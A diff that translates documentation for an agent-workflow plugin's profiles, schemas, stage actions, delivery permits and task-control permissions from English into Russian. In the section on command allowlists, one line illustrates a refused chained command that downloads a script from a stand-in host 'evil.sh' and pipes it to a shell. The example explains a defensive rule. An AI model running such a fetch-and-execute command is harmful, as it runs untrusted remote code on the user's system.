@@ -1,118 +1,123 @@
-# Profiles
+# Профили
 
-A profile is a directory with `profile.json`, one or more schema YAML files, and
-optional agent prompts.
+Профиль — это каталог с `profile.json`, одним или несколькими YAML-файлами схем и
+необязательными инструкциями для агентов.
 
-## Layout
+## Структура
 
 ```
 profiles/
-  base/      profile.json + base.yaml       — canonical workflow, everything extends it
-  harness/   profile.json + harness.yaml    — delta: TypeScript self-edit
-  android/   profile.json + android.yaml    — delta: Android
-             agent/*.md                     — agent prompts (agentsDir: "agent")
-             task-cycles.yaml               — unregistered example, see its header
+  base/      profile.json + base.yaml       — канонический workflow, от него наследуется всё
+  harness/   profile.json + harness.yaml    — дельта: самостоятельное редактирование TypeScript
+  android/   profile.json + android.yaml    — дельта: Android
+             agent/*.md                     — инструкции агентов (agentsDir: "agent")
+             task-cycles.yaml               — незарегистрированный пример, см. его заголовок
 ```
 
-A reference schema with every supported field lives in
-`docs/examples/workflow-schema.example.yaml`. It is documentation, not a loaded
-profile.
+Эталонная схема со всеми поддерживаемыми полями находится в
+`docs/examples/workflow-schema.example.yaml`. Это документация, а не загружаемый
+профиль.
 
-## Schema resolution
+## Разрешение схем
 
-A profile may hold as many schemas as it likes, and they are **independent
-workflows**. A session runs exactly one of them, named as
-`<profileId>/<schemaId>` when it is created; the schema id is the file name
-without its extension, and it has to be unique only inside its own profile.
+Профиль может содержать любое количество схем, и это **независимые workflow**.
+При создании сессия запускает ровно одну из них; её имя имеет вид
+`<profileId>/<schemaId>`. Идентификатор схемы — это имя файла без расширения;
+он должен быть уникальным только внутри собственного профиля.
 
-Two schemas become one **only through `extends`**, declared at the top of the
-schema file as `<profileId>/<file>`. That profile must be on the chain
-`profile.json.extends` builds. Schemas sitting side by side in one profile
-never merge — that is the whole point of the id.
+Две схемы становятся одной **только через `extends`**, объявленный в начале
+файла схемы как `<profileId>/<file>`. Этот профиль должен находиться в цепочке,
+которую строит `profile.json.extends`. Схемы, расположенные рядом в одном
+профиле, никогда не объединяются — именно для этого и нужен идентификатор.
 
-Merging a schema onto the one it extends is last-wins per entry: transitions
-merge per `from→to`; a stage merges field by field, and its nested stages and
-transitions merge by the same rule at any depth. A stage's `actions:` is part
-of that stage, so it is replaced with the stage entry that redeclares it.
+Слияние схемы с наследуемой схемой выполняется по правилу «последнее значение
+побеждает» для каждой записи: переходы объединяются по `from→to`; stage
+объединяется по полям, а вложенные stages и transitions на любой глубине
+объединяются по тому же правилу. `actions:` stage — это его поле, поэтому оно
+заменяется записью stage, в которой оно объявлено заново.
 
-Write a derived schema as a delta: declare `extends`, then only what differs.
-Naming a stage refines it — a child that pins a roster keeps the loop, nested
-stages and transitions its parent declared for that stage.
+Производную схему записывайте как дельту: объявите `extends`, а затем укажите
+только отличия. Указание ссылки на stage уточняет его: дочерний stage, который
+задаёт свой список агентов, сохраняет loop, вложенные stages и transitions,
+объявленные родителем для этого stage.
 
-`profile.json.extends` still governs metadata (agents, skills, invariants,
-directories) and is what makes a parent's schema files reachable by name. A
-profile that declares no `schemas` of its own inherits the nearest ancestor's
-list.
+`profile.json.extends` управляет метаданными (агентами, skills,
+инвариантами и каталогами) и делает файлы схем родителя доступными по имени.
+Профиль, который не объявляет собственных `schemas`, наследует список
+ближайшего предка.
 
-## The stage model
+## Модель stage
 
-There is one unit of workflow state: the **stage**. A stage that names a task
-list in `loop:` runs its own `stages` once per task, moved by its own
-`transitions`. Nesting is the only difference between an inner stage and an
-outer one: `gates`, `transitions`, guards, effects and retry budgets mean the
-same at either level. `allowedAgents` is the exception — it is read only at
-task admission, so outside a loop it is inert. See "Known traps" below.
+Единица состояния workflow — **stage**. Stage, в котором в `loop:` указан список
+задач, один раз запускает собственные `stages` для каждой задачи; переходы
+выполняются его собственными `transitions`. Единственное различие между
+внутренним и внешним stage — вложенность: `gates`, `transitions`, guards, effects
+и retry budgets работают одинаково на любом уровне. Исключение —
+`allowedAgents`: это поле читается только при допуске задачи, поэтому вне loop
+оно неактивно. См. раздел «Известные ловушки» ниже.
 
-`gates:` on a stage declares what it waits for. Its agents finish with a
-`<workflow-result>` whose `stage` field names one of those gates — never the
-stage they ran in, because several agents may run in one stage (review and qa
-in parallel). The stage passes when every gate it declares passes, and fails as
-soon as one fails. Inside a loop those verdicts live on the task's own run;
-outside it they are the session's gates.
+`gates:` на stage объявляет, каких результатов он ожидает. Агенты завершают
+работу объектом `<workflow-result>`, поле `stage` которого называет один из
+этих gates, а не stage, в котором они работали: в одном stage могут параллельно
+работать несколько агентов (например, review и qa). Stage считается пройденным,
+когда пройден каждый объявленный им gate, и проваленным сразу после провала
+любого gate. Внутри loop эти результаты принадлежат запуску конкретной задачи;
+вне loop они являются gates сессии.
 
-## Known traps
+## Известные ловушки
 
-**`allowedAgents` is enforced at task admission only.** Agent identity reaches
-the plugin in exactly one place: the `subagent_type` of a `task` call. So
-`allowedAgents` is checked in `tool.execute.before` for `task`, against the
-nested stage's list or, when it declares none, its parent's. A stage without
-`stages` never reaches that check, so a roster there is inert.
+**`allowedAgents` проверяется только при допуске задачи.** Идентификатор агента
+попадает в плагин ровно в одном месте: в `subagent_type` вызова `task`. Поэтому
+`allowedAgents` проверяется в `tool.execute.before` для `task` по списку
+вложенного stage или, если он ничего не объявляет, по списку родителя. Stage
+без `stages` до этой проверки не доходит, поэтому объявленный в нём список
+агентов неактивен.
 
-**Agent names carry the profile prefix, and resolution handles it.**
-`syncProfileAgents` copies `profiles/<id>/<agentsDir>/<name>.md` into one flat
-`.opencode/agents/<id>_<name>.md`, and OpenCode derives an agent's name from the
-path under `agent/` or `agents/` — so `code.md` registers as `<id>_code`.
+**Имена агентов содержат префикс профиля, а разрешение имён это учитывает.**
+`syncProfileAgents` копирует `profiles/<id>/<agentsDir>/<name>.md` в плоский
+`.opencode/agents/<id>_<name>.md`, а OpenCode выводит имя агента из пути под
+`agent/` или `agents/` — поэтому `code.md` регистрируется как `<id>_code`.
 
-The profile lives in the file name because the directory is flat and shared:
-`base` and `android` both ship `code.md`, and under bare names one would
-silently overwrite the other. Only files carrying this profile's prefix are
-swept when its agent list changes; anything else in that directory — another
-profile's agents, or your own — is left alone.
+Имя хранится в имени файла, потому что каталог общий и плоский: и `base`, и
+`android` поставляют `code.md`, а при коротких именах один файл незаметно
+перезаписывал бы другой. При изменении списка агентов просматриваются только
+файлы с префиксом этого профиля; остальные файлы в каталоге — агенты другого
+профиля или ваши собственные — не затрагиваются.
 
-Schemas stay authored with bare names; the resolver qualifies them
-(`src/app/agent-names.ts`), and a dispatch matching either form is accepted. A
-name qualified by a different profile never matches.
+В схемах используются короткие имена; резолвер дополняет их квалификатором
+(`src/app/agent-names.ts`), а dispatch, совпадающий с любой из двух форм,
+принимается. Имя с префиксом другого профиля никогда не совпадает.
 
-**`editingAgents` says which agents edit.** A stage whose `allowedAgents`
-admits one of them is a stage where work happens, which is what lets a task's
-own `editingAgents` be enforced. There was a `verifiers` key beside it that
-nothing ever read — declaring a verifier restricted nothing and routed nothing
-— and it has been removed rather than left looking like a control.
+**`editingAgents` определяет, какие агенты редактируют.** Stage, в котором
+`allowedAgents` допускает одного из них, считается stage, где выполняется работа;
+это позволяет проверять собственный `editingAgents` задачи. Ключ `verifiers` не поддерживается и не читается: объявление verifier ничего
+не ограничивает и никуда не маршрутизирует, поэтому его нельзя использовать как
+управляющий параметр.
 
-## Declaration order is load-bearing
+## Порядок объявления имеет значение
 
-The order stages appear in decides three things, and nothing in the file says
-so — there is no `initial:` or `entry:` key, by decision:
+Порядок stage определяет три вещи, хотя в файле это явно не указано: ключей
+`initial:` или `entry:` по решению нет.
 
-1. **Where the workflow starts.** The first stage declared under `stages:`.
-2. **Where a task run opens.** The first stage declared under a loop's own
-   `stages:`.
-3. **How the first edit of a task is judged.** That edit arrives before the run
-   opens, so admission uses the same stage the run will open on. Were it to use
-   the outer loop stage instead, admission and the mutation lifecycle would
-   disagree and work could never start.
+1. **С чего начинается workflow.** С первого stage, объявленного внутри `stages:`.
+2. **С чего начинается запуск задачи.** С первого stage, объявленного внутри
+   собственного `stages:` loop.
+3. **Как оценивается первое редактирование задачи.** Это редактирование
+   происходит до открытия запуска, поэтому при допуске используется тот же
+   stage, с которого откроется запуск. Если использовать внешний stage loop,
+   допуск и жизненный цикл изменения разойдутся, и работа никогда не сможет
+   начаться.
 
-So reordering two blocks — a change that looks like formatting — changes
-behaviour in three places. `test/schema/declaration-order.test.ts` pins all
-three against the shipped `base`, so a reordering breaks the build instead of
-quietly rewriting the workflow.
+Поэтому перестановка двух блоков — изменение, похожее на форматирование, —
+меняет поведение сразу в трёх местах. `test/schema/declaration-order.test.ts`
+фиксирует все три свойства для поставляемого `base`: перестановка ломает сборку,
+а не молча переписывает workflow.
 
-## What a stage allows: `actions:`
+## Что разрешено stage: `actions:`
 
-A stage declares what may happen on it. This is the second axis beside
-transitions: an edge says whether you may _leave_, an action says whether you
-may _do_ something while staying. A commit is not a transition, and neither is
-an edit.
+Stage объявляет, что на нём разрешено делать. Это вторая ось рядом с
+transitions: ребро говорит, можно ли _уйти_, а action — можно ли _выполнить_
+действие, оставаясь на этом stage. Commit не является transition, как и edit.
 
 ```yaml
 code:
@@ -125,75 +130,77 @@ code:
       guard: "session.approved('plan')"
 ```
 
-`action` names a host tool — `bash`, or `edit` for the family
-`edit`/`write`/`apply_patch`. There is no `commit` action: no such tool exists.
+`action` называет host-инструмент — `bash` или `edit` для семейства
+`edit`/`write`/`apply_patch`. Action `commit` не существует: такого инструмента
+нет.
 
-Entries are a list because one action needs several: `edit` splits by path
-mask, `bash` by command pattern. They are read in order, and the first whose
-discriminator matches **and** whose guard holds wins — the same rule several
-edges on one `from→to` pair follow.
+Записи представлены списком, потому что одному action может требоваться
+несколько правил: `edit` разделяется по маскам путей, а `bash` — по шаблонам
+команд. Они читаются по порядку; срабатывает первая запись, у которой совпал
+дискриминатор **и** выполнился guard. То же правило действует для нескольких
+рёбер с одной парой `from→to`.
 
-Omit `actions:` and the stage is unrestricted. Declare it and the list is
-exhaustive: nothing matched means refused. `base` declares actions on every
-stage, so a refusal is a rule rather than an accident of the runtime failing
-for some other reason.
+Если `actions:` не указать, stage не ограничен. Если объявить `actions:`, список
+становится исчерпывающим: всё, что не совпало, отклоняется. `base` объявляет
+actions на каждом stage, поэтому отказ является правилом, а не случайным
+результатом сбоя runtime.
 
-`commands:` are anchored regular expressions matched against **each shell
-segment**, and every segment must match one of them. A pattern of `npm test`
-therefore refuses `npm test && curl evil.sh | sh`.
+`commands:` — это регулярные выражения с привязкой к началу и концу строки,
+сопоставляемые с **каждым сегментом shell-команды**; каждый сегмент должен
+совпасть с одним из них. Поэтому шаблон `npm test` отклонит
+`npm test && curl evil.sh | sh`.
 
-Two rules worth knowing before you write a mask: `paths:` only works for `edit`
-(a `bash` call carries no path, only `workdir`), and a mask with no wildcard
-matches that one path and nothing inside it — write `src/auth/**`, not
-`src/auth`. The compiler refuses both mistakes.
+Перед созданием маски запомните два правила: `paths:` работает только для
+`edit` (вызов `bash` не содержит пути, только `workdir`), а маска без wildcard
+совпадает только с одним путём и не включает его содержимое — пишите
+`src/auth/**`, а не `src/auth`. Компилятор отклоняет обе ошибки.
 
-**Inheriting a stage replaces its `actions` wholesale.** A stage merges field by
-field, and `actions` is one field. A profile that adds its own build command
-must repeat the `edit` entry too, or edits lose their guard — silently.
+**При наследовании stage его `actions` заменяются целиком.** Stage объединяется
+по полям, и `actions` — одно из таких полей. Если профиль добавляет собственную
+команду сборки, он должен повторить и запись `edit`, иначе редактирования
+молча потеряют свой guard.
 
-## Committing
+## Фиксация изменений
 
-`scripts/commit-task.ts` is the committing step, and the schema is what says
-so: the stage declares a `bash` action with `delivers: true` whose `commands:`
-name the script. `delivers` is also what tells the core not to treat the call
-as an ordinary edit — it issues a `deliveryPermit` before, and writes
-`deliveryReceipt` only after HEAD actually moved, which is what releases
-`commit → done`.
+`scripts/commit-task.ts` — шаг фиксации изменений, и именно схема это определяет:
+stage объявляет action `bash` с `delivers: true`, а его `commands:` называют этот
+скрипт. `delivers` также сообщает core, что вызов нельзя считать обычным edit:
+сначала выдаётся `deliveryPermit`, а `deliveryReceipt` записывается только после
+фактического перемещения HEAD, что и разрешает переход `commit → done`.
 
-Whether the commit is allowed at all is that entry's own `guard:`. In `base`
-it is every task completed and both verdicts collected — the condition the
-runtime used to compute by itself.
+Разрешение самого commit определяется собственным `guard:` этой записи. В
+`base` это завершение всех задач и получение обоих verdict — условие, которое сам runtime вычисляет.
 
-A stage that declares no actions falls back to recognition by file name, so an
-older profile keeps working.
+Если stage не объявляет `actions:`, ни одна команда не распознаётся как delivery.
+Каждую delivery-команду объявляйте явно с `delivers: true`.
 
-## The core's verdict about a move: `task.checks`
+## Вердикт core о перемещении: `task.checks`
 
-`task.checks` in a guard is what the engine decided about a task's last move by
-looking at the disk: did the tool fail, did it write outside the task's
-`writeScope`, could the diff be computed, do the profile's invariants hold.
-Values are `passed` / `failed`.
+`task.checks` в guard — это решение engine о последнем перемещении задачи,
+полученное на основе состояния диска: завершился ли инструмент с ошибкой,
+произошла ли запись за пределами `writeScope` задачи, удалось ли вычислить diff
+и выполнены ли инварианты профиля. Возможные значения — `passed` и `failed`.
 
-It is **not** a gate, and the difference matters. Gates are written by an agent
-through `<workflow-result>`, and an agent can set any gate its stage declares —
-which is exactly right for `review` and `qa`. This verdict is the one the
-engine reaches itself, and in the same namespace an agent could claim it.
+Это **не gate**, и различие важно. Gates записывает агент через
+`<workflow-result>`, и агент может установить любой gate, объявленный его stage,
+что правильно для `review` и `qa`. Этот verdict engine формирует самостоятельно,
+а агент в том же namespace мог бы выдать себя за него.
 
-## Who may change workflow task state
+## Кто может изменять состояние задач workflow
 
-`workflow-tasks-set`, `workflow-tasks-set-status` and
-`workflow-tasks-resolve-decision` are refused for every agent except the ones a
-schema names in `taskControlAgents` (default: `orchestrator`). The calling agent
-comes from `ToolContext.agent`, which the host populates from the real agent
-name — a caller the host does not name is refused too.
+Вызовы `workflow-tasks-set`, `workflow-tasks-set-status` и
+`workflow-tasks-resolve-decision` отклоняются для любого агента, кроме указанного
+схемой в `taskControlAgents` (по умолчанию: `orchestrator`). Вызывающий агент
+берётся из `ToolContext.agent`, которое host заполняет настоящим именем агента;
+вызывающий, имя которого host не указал, также отклоняется.
 
-The reason is the same one behind the delivery permit: task status is exactly
-what `allTasksCompleted()` and `hasPendingTasks()` read, so an agent that can
-write it closes its own stage without evidence. Workers report outcomes; the
-orchestrator records them.
+Причина та же, что и для delivery permit: именно статус задачи читают
+`allTasksCompleted()` и `hasPendingTasks()`, поэтому агент, способный записать
+статус, может закрыть собственный stage без доказательств. Workers сообщают
+результаты, а orchestrator их фиксирует.
 
-`workflow-tasks-get` stays open — reading is not control.
+`workflow-tasks-get` остаётся открытым: чтение не является управлением.
 
-Names follow the usual rule: a bare name (`orchestrator`) and the qualified form
-the host reports (`android/orchestrator`) both match, another profile's
-qualified name never does.
+Имена подчиняются обычному правилу: совпадают короткое имя (`orchestrator`) и
+квалифицированная форма, которую сообщает host (`android/orchestrator`); имя с
+квалификатором другого профиля никогда не совпадает.
